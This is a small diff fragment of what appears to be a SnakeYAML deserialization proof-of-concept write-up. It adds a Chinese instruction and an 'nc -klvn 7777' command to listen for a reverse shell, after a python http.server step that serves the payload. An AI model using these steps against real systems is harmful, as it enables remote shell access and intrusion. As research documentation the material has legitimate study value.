@@ -99,4 +99,7 @@ root@silicon:~/snakeyaml-poc# find .
 ```
 python3 -m http.server 8888
 ```
-
+使用nc监听，待反弹shell。
+```
+nc -klvn 7777
+```
